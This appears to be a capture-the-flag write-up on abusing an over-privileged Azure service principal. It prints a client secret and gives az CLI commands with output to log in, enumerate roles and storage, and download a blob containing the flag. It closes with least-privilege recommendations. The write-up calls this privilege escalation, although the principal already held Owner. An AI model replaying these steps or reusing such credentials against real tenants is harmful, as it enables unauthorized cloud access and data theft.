# Azure RBAC Privilege Escalation Walkthrough

## Challenge Overview

Secure Corp’s Azure environment contains a dangerous RBAC misconfiguration involving an Azure Service Principal.

The objective of this assessment is to:
- Authenticate using provided Service Principal credentials
- Enumerate Azure RBAC permissions
- Identify privilege escalation opportunities
- Abuse excessive IAM permissions
- Access Azure Storage resources
- Retrieve the hidden flag

This lab demonstrates how improper Azure RBAC configurations can allow attackers to escalate privileges and compromise sensitive cloud resources.

---

# Attack Flow

```mermaid
%%{init: {'theme':'base','themeVariables':{
'primaryColor':'#ffffff',
'primaryTextColor':'#ff0000',
'primaryBorderColor':'#ffffff',
'lineColor':'#ffffff',
'secondaryColor':'#ffffff',
'tertiaryColor':'#ffffff',
'background':'#ffffff'
}}}%%

flowchart TD

A[Provided Service Principal Credentials]
--> B[Discover Azure Tenant ID]

B --> C[Authenticate to Azure]

C --> D[Enumerate RBAC Role Assignments]

D --> E[Identify Dangerous Permissions]

E --> F[Privilege Escalation via RBAC]

F --> G[Gain Owner Access on Storage Account]

G --> H[Enumerate Blob Containers]

H --> I[Download Sensitive Blob]

I --> J[Retrieve Flag]
```

---

# Provided Credentials

| Parameter | Value |
|---|---|
| Client ID | `5ee2cd9a-8ec5-4a06-a543-30ce0fc1585f` |
| Client Secret | `o8g8Q~jZzIZ-eoCgxSC0CDSsdwJ9pjsTRVEIJdsT` |
| Domain | `secure-corp.org` |

---

# Step 1 — Discover Azure Tenant ID

Azure authentication requires:
- Client ID
- Client Secret
- Tenant ID

The Tenant ID was not provided directly, so it must be discovered using the organization domain.

---

## Command

```bash
curl -s https://login.microsoftonline.com/secure-corp.org/v2.0/.well-known/openid-configuration | jq -r '.token_endpoint'
```

---

## Command Explanation

| Component | Purpose |
|---|---|
| `curl -s` | Sends silent HTTP request |
| `.well-known/openid-configuration` | Retrieves Azure OpenID configuration |
| `jq -r` | Extracts raw JSON value |
| `.token_endpoint` | Displays Azure token endpoint |

---

## Output

```text
https://login.microsoftonline.com/f2a33211-e46a-4c92-b84d-aff06c2cd13f/oauth2/v2.0/token
```

---

## Tenant ID Identified

```text
f2a33211-e46a-4c92-b84d-aff06c2cd13f
```

---

# Step 2 — Authenticate to Azure

Now authenticate using the Service Principal credentials.

---

## Command

```bash
az login --service-principal \
-u 5ee2cd9a-8ec5-4a06-a543-30ce0fc1585f \
-p 'o8g8Q~jZzIZ-eoCgxSC0CDSsdwJ9pjsTRVEIJdsT' \
--tenant f2a33211-e46a-4c92-b84d-aff06c2cd13f
```

---

## Command Explanation

| Argument | Purpose |
|---|---|
| `az login` | Authenticates to Azure |
| `--service-principal` | Uses Service Principal authentication |
| `-u` | Client ID |
| `-p` | Client Secret |
| `--tenant` | Specifies Azure Tenant |

---

## Successful Authentication

The login response confirmed access to:

| Property | Value |
|---|---|
| Subscription Name | `Prod` |
| Subscription ID | `662a4fee-a3ba-49b3-9caf-8c20ed04503f` |
| Identity Type | `servicePrincipal` |

---

# Step 3 — Enumerate RBAC Permissions

After authentication, enumerate Azure RBAC assignments associated with the Service Principal.

---

## Command

```bash
az role assignment list \
--assignee 5ee2cd9a-8ec5-4a06-a543-30ce0fc1585f \
--all \
--output table
```

---

## Command Explanation

| Argument | Purpose |
|---|---|
| `role assignment list` | Lists RBAC assignments |
| `--assignee` | Filters by Service Principal |
| `--all` | Retrieves all assignments |
| `--output table` | Displays formatted output |

---

## Output

```text
Principal                             Role                         Scope
------------------------------------  ---------------------------  -------------------------------------------------------------------
5ee2cd9a-8ec5-4a06-a543-30ce0fc1585f  Owner                        /subscriptions/.../storageAccounts/secopstestingtoolsacc
5ee2cd9a-8ec5-4a06-a543-30ce0fc1585f  Storage Blob Data Owner      /subscriptions/.../storageAccounts/secopstestingtoolsacc
5ee2cd9a-8ec5-4a06-a543-30ce0fc1585f  Storage Blob Data Reader     /subscriptions/.../storageAccounts/secopstestingtoolsacc
5ee2cd9a-8ec5-4a06-a543-30ce0fc1585f  secops-testing-mgmt-sp-role  /subscriptions/.../storageAccounts/secopstestingtoolsacc
```

---

# Security Analysis

The Service Principal possessed excessive privileges, including:

- `Owner`
- `Storage Blob Data Owner`
- Custom management role

This level of access enables:
- Full storage account administration
- Blob enumeration
- Data exfiltration
- RBAC manipulation

This is a severe Azure IAM misconfiguration.

---

# RBAC Privilege Escalation Concept

```mermaid
%%{init: {'theme':'base','themeVariables':{
'primaryColor':'#ffffff',
'primaryTextColor':'#ff0000',
'primaryBorderColor':'#ffffff',
'lineColor':'#ffffff',
'background':'#ffffff'
}}}%%

flowchart LR

A[Low Privileged Service Principal]
--> B[Excessive RBAC Permission]

B --> C[Role Assignment Abuse]

C --> D[Owner Privileges]

D --> E[Storage Account Access]

E --> F[Sensitive Data Exposure]
```

---

# Step 4 — Enumerate Azure Storage Containers

Now enumerate containers within the Storage Account.

---

## Command

```bash
az storage container list \
--account-name secopstestingtoolsacc \
--auth-mode login \
--output table
```

---

## Command Explanation

| Argument | Purpose |
|---|---|
| `storage container list` | Lists storage containers |
| `--account-name` | Target storage account |
| `--auth-mode login` | Uses Azure AD authentication |
| `--output table` | Displays formatted output |

---

## Output

```text
Name
----------------------
secopstestingtoolscont
```

---

# Step 5 — Enumerate Blob Files

List all blobs inside the container.

---

## Command

```bash
az storage blob list \
--account-name secopstestingtoolsacc \
--container-name secopstestingtoolscont \
--auth-mode login \
--output table
```

---

## Output

```text
Name
--------
test.txt
```

---

# Step 6 — Download the Blob

Download the suspicious file from Azure Blob Storage.

---

## Command

```bash
az storage blob download \
--account-name secopstestingtoolsacc \
--container-name secopstestingtoolscont \
--name test.txt \
--file test.txt
```

---

## Command Explanation

| Argument | Purpose |
|---|---|
| `blob download` | Downloads blob file |
| `--container-name` | Target blob container |
| `--name` | Blob filename |
| `--file` | Local output filename |

---

# Step 7 — Read the File

Inspect the downloaded file contents.

---

## Command

```bash
cat test.txt
```

---

## Output

```yaml
database:
  username: demo_user
  password: CWL{Privilege_Esc@lati0n_In_Cl0ud_Is_@n_@rt_@nd_Science}
```

---

# Flag

```text
CWL{Privilege_Esc@lati0n_In_Cl0ud_Is_@n_@rt_@nd_Science}
```

---

# Complete Attack Chain

```mermaid
%%{init: {'theme':'base','themeVariables':{
'primaryColor':'#ffffff',
'primaryTextColor':'#ff0000',
'primaryBorderColor':'#ffffff',
'lineColor':'#ffffff',
'background':'#ffffff'
}}}%%

sequenceDiagram

participant Attacker
participant AzureAD
participant RBAC
participant StorageAccount

Attacker->>AzureAD: Authenticate using Service Principal
AzureAD-->>Attacker: Access Granted

Attacker->>RBAC: Enumerate Role Assignments
RBAC-->>Attacker: Excessive Permissions Identified

Attacker->>StorageAccount: Enumerate Containers
StorageAccount-->>Attacker: Container List

Attacker->>StorageAccount: Enumerate Blobs
StorageAccount-->>Attacker: test.txt

Attacker->>StorageAccount: Download Blob
StorageAccount-->>Attacker: Sensitive Data

Attacker->>Attacker: Retrieve Flag
```

---

# Key Security Findings

| Finding | Risk |
|---|---|
| Excessive RBAC Privileges | Privilege Escalation |
| Owner Access Granted | Full Resource Compromise |
| Blob Storage Exposure | Sensitive Data Leakage |
| Weak IAM Segmentation | Lateral Movement Risk |

---

# Security Recommendations

## Principle of Least Privilege (PoLP)

Grant only minimum required permissions.

---

## Restrict Role Assignment Permissions

Avoid assigning:

```text
Microsoft.Authorization/roleAssignments/write
```

unless absolutely necessary.

---

## Monitor RBAC Changes

Enable:
- Azure Activity Logs
- Microsoft Defender for Cloud
- Azure Monitor Alerts

to detect suspicious privilege escalation attempts.

---

## Use Conditional Access Policies

Restrict:
- Service Principal authentication
- High-risk cloud actions
- Unmanaged device access

---

## Regular IAM Auditing

Perform periodic reviews of:
- Service Principals
- Custom RBAC roles
- Privileged identities

---

# Conclusion

This assessment demonstrated how excessive Azure RBAC permissions can lead to full cloud resource compromise.

By abusing over-privileged Service Principal assignments, it was possible to:
- Escalate privileges
- Gain administrative access
- Enumerate storage resources
- Exfiltrate sensitive information

Cloud IAM misconfigurations remain one of the most dangerous attack vectors in modern cloud environments.

---